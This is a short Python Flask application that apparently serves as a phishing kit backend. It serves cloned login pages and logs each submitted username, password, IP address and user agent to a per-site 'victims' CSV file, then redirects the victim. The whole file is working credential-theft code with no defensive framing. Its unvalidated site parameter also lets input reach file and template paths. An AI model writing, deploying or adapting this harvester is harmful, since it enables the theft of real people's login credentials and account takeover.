from flask import Flask, request, render_template, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
import csv
from datetime import datetime

app = Flask(
    __name__,
    template_folder="sites",
    static_url_path="",
    static_folder="sites",
)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)


@app.route("/<site>", methods=["GET", "POST"])
def login(site):
    if request.method == "POST":
        url = request.form.get("url")

        username = request.form.get("username")
        password = request.form.get("password")
        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent")
        now = datetime.now()

        data = [[username, password, ip, user_agent, now]]
        with open(f"victims/{site}.csv", mode="a", newline="") as file:
            writer = csv.writer(file)
            writer.writerows(data)

        print(f"✨ New user has been added to the list ({username})")

        return redirect(url)
    else:
        return render_template(f"{str(site)}/index.html")


if __name__ == "__main__":
    app.run(debug=True)
